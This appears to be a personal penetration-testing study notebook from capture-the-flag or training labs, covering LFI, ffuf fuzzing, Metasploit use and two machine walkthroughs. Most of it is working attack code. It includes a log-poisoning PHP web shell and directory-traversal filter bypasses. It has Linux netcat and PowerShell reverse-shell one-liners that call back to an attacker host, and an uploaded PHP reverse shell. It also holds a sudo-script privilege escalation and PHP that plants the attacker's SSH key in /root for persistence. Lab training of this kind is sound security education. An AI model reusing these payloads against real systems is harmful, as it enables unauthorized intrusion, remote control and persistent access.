# TOC
- LFI
- [Metasploit](#metasploit)
- [RDP](#rdp)
- [Reverse Shell](#reverse-shell)

# Memo
```
http://XXX.XXX.XXX.XXX:49550/index.php?page=php://filter/read=convert.base64-encode/resource=index

$ echo "~~~" | base64 -d | grep ".php"

access to : ilf_admin/index.php"

no ... ffuf -w -u http://XXX.XXX.XXX.XXX:49550/ilf_admin/index.php?log=FUZZ

$ sudo nmap XXX.XXX.XXX.XXX -p49550 -sV

http://XXX.XXX.XXX.XXX:49550/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

 curl -s "http://XXX.XXX.XXX.XXX:49550/index.php" -A '<?php system($_GET["cmd"]); ?>'
 
http://XXX.XXX.XXX.XXX:49550/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id


http://XXX.XXX.XXX.XXX:47450/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

<?php system($_GET["cmd"]); ?>

User-Agent: <?php system($_GET['cmd']); ?>


sudo ip link delete tun0
```

# RDP
```zsh
$ xfreerdp /v:XXX.XXX.XXX.XXX /u:hoge-user /p:hoge-password
```

# Reverse Shell
- Linux
```zsh
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc XXX.XXX.XXX.XXX 7777 > /tmp/f
```
- Windows  
one-liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
beautify  
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX,443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()"
```

# Fuzzing
## Lesson
- the way to use `ffuf`
- the way to use `SecList`

## Memo
```zsh
$ apt install ffuf -y
$ 
$ ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://XXX.XXX.XXX.XXX:YYY/FUZZ
$
# The wordlist we chose already contains a dot (.), so we will not have to add the dot after "index" in our fuzzing.
$ ffuf -w ~/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://XXX.XXX.XXX.XXX:YYY/blog/indexFUZZ
$
$ ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://XXX.XXX.XXX.XXX:YYY/blog/FUZZ.php
$
# Sub-domain Fuzzing
$ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/
#
# VHost Fuzzing
$ ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com' -fs xxx
#
# Parameter Fuzzing
$ ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/admin/admin.php?FUZZ=key -fs xxx
#
# Combination
$ ffuf -w ./mySubdomain.txt:SUB -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://example.com:PORT/FUZZ -H 'Host: SUB.example.com' -recursion -recursion-depth 1 -e .php,.php7,.phps
$
$ ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://XXX.example.com:PORT/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774,780

```
SecList
```zsh
$ wc -l .../SecLists/Usernames/xato-net-10-million-usernames-dup.txt
$ wc -l .../SecLists/Discovery/Web-Content/web-extensions.txt
$ wc -l .../SecLists/Discovery/Web-Content/burp-parameter-names.txt
$ wc -l .../SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

## this is shit  
Sub-domain Fuzzing.  
I could not access the web site.   
I guessed the answer.



# LFI
# Lesson
- LFI (Local File Inclusion)
    - Path Traversal Deep Dive
- php
    - Wrappers 

file search
nmap
burp

# Memo
```php
$language = str_replace('../', '', $_GET['language']);
# can bypass with ....// -> ../
```
```
http://XXX.XXX.XXX.XXX:PORT/index.php?language=languages/....//....//....///....//flag.txt
```



- Skills Assessment - File Inclusion
XXX.XXX.XXX.XXX:41378

```zsh
$ ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://XXX.XXX.XXX.XXX:41378/index.php?message=FUZZ
# nothing
$ ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://XXX.XXX.XXX.XXX:41378/index.php?page=FUZZ
# error                   [Status: 200, Size: 4521, Words: 837, Lines: 127, Duration: 34ms]
# main                    [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 9ms]
# contact                 [Status: 200, Size: 7036, Words: 1569, Lines: 195, Duration: 106ms]
# about                   [Status: 200, Size: 14635, Words: 3194, Lines: 331, Duration: 158ms]
# index                   [Status: 200, Size: 1112127624, Words: 211326301, Lines: 31974589, Duration: 18ms]
# :: Progress: [2588/2588] :: Job [1/1] :: 356 req/sec :: Duration: [0:00:16] :: Errors: 0 ::

$ ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://XXX.XXX.XXX.XXX:41378/index.php?page=FUZZ
# many
# checking browser fs 4521 is blocked
$ ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://XXX.XXX.XXX.XXX:41378/index.php?page=FUZZ -fs 4512,4322,4521
# nothing
$ ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://XXX.XXX.XXX.XXX:41378/index.php?message=FUZZ
# many
$ ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://XXX.XXX.XXX.XXX:41378/index.php?message=FUZZ -fs 15829
# nothing
```

# Getting
# Memo
## Machine 1
target ip: XXX.XXX.XXX.XXX  
my external ip: YYY.YYY.YYY.YYY  
my external port: 9443(user shell), 8080(file transfer), 8443(root shell)  
- upload php  
    image.php  
    ```php
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 9443 >/tmp/f"); ?>
    ```
- access to an uploaded php  
    ```bash
    $ curl http://XXX.XXX.XXX.XXX/nibbleblog/content/private/plugins/my_image/image.php
    ```
- set port-forwarding fow WSL and allow fire-wall for user shell  
- set acceptable shell on WSL  
    ```zsh
    $ nc -lvnp 9443
    ```
- preserve `LinNum.sh`  
- open http server with python  
    ```python
    $ python -m http.server 8080
    ```
- set port-forwarding fow WSL and allow fire-wall for file transfer  
- access from target shell to my computer  
    ```bash
    $ wget http://YYY.YYY.YYY.YYY:8080/LinEnum.sh
    ``````
- run `LinuEnum.sh` on the target machine  
- set port-forwarding fow WSL and allow fire-wall for root shell  
- get root on the target machine  
    - use sudo user and file  
        ```bash
        echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 8443 >/tmp/f' | tee -a monitor.sh
        ```


## Machine 2
target ip: XXX.XXX.XXX.XXX  
my external ip: YYY.YYY.YYY.YYY  
my external port: 9443(user shell), 8000(file transfer)  
- Enumeration  
    - access URL "/admin"  
        ID/PW : admin/admin  
- Exploit  
    - upload image.php manually  
    ```php
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 9443 >/tmp/f"); ?>
    ```
- Enumeration  
    - search something on the target machine  
- Privilege Escalation  
    - upload my.php manually  
        ```php
        <?php system ("wget -P /root/.ssh http://YYY.YYY.YYY.YYY:8000/authorized_keys && chmod 600 /root/.ssh/authorized_keys;") ?>
        ```
    - run  
        ```bash
        $ wget http://YYY.YYY.YYY.YYY:8000/my.php
        ```
    - ssh from my machine to the target machine  

```php
<?php system ("mkdir -p /etc/ssh/sshd_config.d/.ssh && rm /etc/ssh/sshd_config.d/.ssh/* && wget -P /etc/ssh/sshd_config.d/.ssh http://XXX.XXX.XXX.XXX:8000/authorized_keys && chmod 600 /etc/ssh/sshd_config.d/.ssh/authorized_keys;") ?>
<?php system ("wget -P /root/.ssh http://XXX.XXX.XXX.XXX:8000/authorized_keys && chmod 600 /root/.ssh/authorized_keys;") ?>
<?php system ("ls -la /root && cat /root/root.txt;") ?>
```

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YYY.YYY.YYY.YYY 9443 >/tmp/f"); ?>
```

# js
# Lesson
- bash for `ASCII code point conversion` with `xxd` command
- bash for `Caesar cipher` with `tr` command
- `xxd`
  - `-x` option:  
    The -x option stands for "hexdump."  
    It displays the hex dump of the file in a more verbose format, including the hexadecimal offset, the hexadecimal values of each byte, and the ASCII representation of the data.
  - `-p` option:  
    The -p option stands for "plain."  
    It displays a plain hex dump without the offset and ASCII representation, just the hexadecimal values of the bytes.

# Memo
```console
$ echo https://example.com/ | xxd -p
68747470733a2f2f6578616d706c652e636f6d2f0a
$
$ echo 68747470733a2f2f6578616d706c652e636f6d2f0a | xxd -p -r
https://example.com/
$ echo 68 | xxd -p -r
h                                                                                                                  $
$ echo 6874 | xxd -p -r
ht
```
```console
$ echo https://example.com | tr 'A-Za-z' 'N-ZA-Mn-za-m'
uggcf://rknzcyr.pbz
$
$ echo uggcf://rknzcyr.pbz | tr 'A-Za-z' 'N-ZA-Mn-za-m'
https://example.com
```

# Metasploit
## Lesson Learn
- how to use `Metasploit`  
    - In Metasploit, how to use a session with [CTRL] + [Z] or `bg` command.  
- how to set Reverse Shell for WSL  
    - It doen't work well when you use Metasploit due to network.

## Memo
```
msf6> search hogeService
msf6> use 3
msf6> options
msf6> set RHOSTS XXX.XXX.XXX.XXX
msf6> set LHOST YYY.YYY.YYY.YYY
msf6> run
meterpreter> shell
getuid
sudo -V
exit
meterpreter > [CTRL] + [Z] or bg
msf6> search sudo 1.8.31
msf6> use 0
msf6> sessions
msf6> set SESSION [number]
msf6> run
```